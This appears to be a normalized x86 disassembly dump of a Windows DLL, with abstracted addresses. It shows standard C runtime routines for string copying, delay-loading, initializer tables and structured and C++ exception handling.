push [ ebp + 0x8 ]
call sub_1002d3c5
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100235ad
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002355c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_100235e0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_100235f0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_100236d8
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_10023708
mov edi edi
push ebp
mov ebp esp
call sub_1002ac8b
push [ ebp + 0x8 ]
call sub_1002aae0
push [ rw-data ]
call sub_10027c38
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_10023731
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10023786
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_100237a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_100237c7
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1002d47d
push r--data
push r--data
call sub_100237a3
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_1002d530
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_100288fa
call sub_10024d30
mov eax r--data
mov [ esp ] r--data
call sub_10023786
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_1002d530
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1002384c
push 0x18
push r--data
call sub_10028b48
push 0x8
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023963
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10028b8d
retn
mov [ rw-data ] ebx
push 0x8
call sub_10028e74
pop ecx
push [ ebp + 0x8 ]
call sub_1002375c
push r--data
mov eax r--data
call sub_10023786
pop ecx
push [ rw-data ]
call sub_10027c38
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_10023786
pop ecx
push [ rw-data ]
call sub_10027c38
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_10027c2f
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_10027c38
mov edi eax
call sub_10027c2f
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_10027c38
mov edi eax
push [ rw-data ]
call sub_10027c38
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_100239b3
mov edi edi
push esi
call sub_10027c2f
mov esi eax
push esi
call sub_10027735
push esi
call sub_1002d8a3
push esi
call sub_10020442
push esi
call sub_1002ae43
push esi
call sub_1002d894
push esi
call sub_1002d682
push esi
call sub_100289c4
push esi
call sub_1002d671
push sub_1002398e
call sub_10027bbd
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_10023a01
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10023a4d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_10023a86
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10023ada
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024b23
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_10023b10
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10020040
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_10024b23
add esp 0x20
pop esi
pop ebp
retn
sub_10023b43
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10023c1a
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_10027e84
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_10023c1a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10020040
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_10024b23
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_10023b43
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10023a86
pop ebx
leave
retn
sub_10023cb9
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1002d639
call sub_1002d639
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_10023d2e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10027e84
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_10027e84
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_10023d5a
mov edi edi
push ebp
mov ebp esp
call sub_10027e84
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_10023d81
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10027e84
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_10027e84
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_10027e84
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1002d639
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_10023dd3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_10023b10
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1002d920
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_10023e33
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10023e66
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10023e9c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10023ed2
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10023f3d
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_100201fc
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10023f66
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100202c9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10023f8d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_10023fec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_10027e84
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_10027e84
add eax 0x90
dec [ eax ]
call sub_10027e84
and [ eax + 0x90 ] 0x0
jmp sub_1002d5ed
sub_10024035
push 0x10
push r--data
call sub_10028b48
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100240fb
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_10027e84
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_10028b8d
retn
call sub_1002d639
call sub_1002d639
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_1002d920
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_10024116
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_10027e84
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1002415b
push 0x8
push r--data
call sub_10028b48
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_10028b8d
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_10023a7f
mov [ ebp - 0x4 ] 0xfffffffe
sub_100241b0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_100241ec
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_1002d639
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_10023f8d
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_100242b0
push 0x2c
push r--data
call sub_10028b48
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10023d2e
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_10027e84
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_10027e84
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_10027e84
mov [ eax + 0x88 ] esi
call sub_10027e84
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_10023dd3
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_100243d6
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
sub_10024349
mov esp [ ebp - 0x18 ]
call sub_10027e84
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_10024035
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_100243d6
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_100243d6
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10023d81
pop ecx
call sub_10027e84
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_10027e84
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_10023d5a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1002415b
pop ecx
pop ecx
sub_1002444c
push 0xc
push r--data
call sub_10028b48
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002d639
push ebx
push esi
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1002d96c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10027850
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1002d96c
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_100241b0
pop ecx
pop ecx
push eax
push esi
call sub_10027850
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_10028b8d
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_100241b0
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_100245cb
push 0x8
push r--data
call sub_10028b48
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_100241b0
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10023a7f
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
